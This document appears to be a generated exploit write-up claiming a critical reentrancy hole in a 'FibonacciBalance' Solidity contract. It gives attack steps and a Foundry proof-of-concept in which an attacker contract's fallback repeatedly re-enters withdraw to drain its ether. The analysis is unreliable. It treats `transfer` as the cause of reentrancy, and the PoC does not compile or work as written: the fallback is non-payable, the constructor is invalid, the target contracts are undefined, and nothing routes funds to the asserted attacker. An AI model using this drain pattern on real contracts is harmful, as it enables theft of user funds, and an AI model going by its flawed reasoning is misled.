# Red Team Exploit Manual
## üî• Severity & Impact:
The identified Reentrancy Vulnerability is considered **Critical** because it allows an attacker to drain the contract's funds by repeatedly reentering the `withdraw` function. This can lead to a complete loss of ether stored in the contract, resulting in significant financial damage. The severity is heightened due to the fact that the contract uses the `transfer` function to send ether to the user, which can be exploited by a malicious contract to reenter the `withdraw` function.

## ‚öîÔ∏è The Attack Scenario (Step-by-Step):
1. **Deploy the vulnerable contract**: Deploy the `FibonacciBalance` contract with a `FibonacciLib` library contract.
2. **Create a malicious contract**: Create a new contract that will be used to exploit the vulnerability. This contract should have a fallback function that calls the `withdraw` function of the vulnerable contract.
3. **Fund the malicious contract**: Send some ether to the malicious contract to cover the gas costs of the exploit.
4. **Call the `withdraw` function**: Call the `withdraw` function of the vulnerable contract from the malicious contract.
5. **Reenter the `withdraw` function**: The malicious contract's fallback function will be triggered, allowing it to reenter the `withdraw` function of the vulnerable contract.
6. **Repeat steps 4-5**: Continue reentering the `withdraw` function until the contract's funds are depleted.

## üíª Proof of Concept (Foundry Code):
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

contract TestExploit is Test {
    FibonacciBalance public fibonacciBalance;
    FibonacciLib public fibonacciLib;
    address public attacker;

    function setUp() public {
        fibonacciLib = new FibonacciLib();
        fibonacciBalance = new FibonacciBalance(address(fibonacciLib));
        attacker = address(0x1337);
    }

    function testExploit() public {
        // Fund the vulnerable contract
        payable(address(fibonacciBalance)).transfer(10 ether);

        // Create a malicious contract
        MaliciousContract maliciousContract = new MaliciousContract(address(fibonacciBalance));

        // Fund the malicious contract
        payable(address(maliciousContract)).transfer(1 ether);

        // Set the attacker's address in the malicious contract
        maliciousContract.setAttacker(attacker);

        // Call the withdraw function from the malicious contract
        maliciousContract.attack();

        // Assert that the attacker's balance has increased
        assertEq(attacker.balance, 10 ether);
    }
}

contract MaliciousContract {
    address public fibonacciBalance;
    address public attacker;

    constructor(address _fibonacciBalance) public {
        fibonacciBalance = _fibonacciBalance;
    }

    function setAttacker(address _attacker) public {
        attacker = _attacker;
    }

    function attack() public {
        (bool success, ) = fibonacciBalance.call(abi.encodeWithSelector(FibonacciBalance.withdraw.selector));
        require(success, "Failed to call withdraw function");
    }

    fallback() external {
        (bool success, ) = fibonacciBalance.call(abi.encodeWithSelector(FibonacciBalance.withdraw.selector));
        require(success, "Failed to call withdraw function");
    }
}
```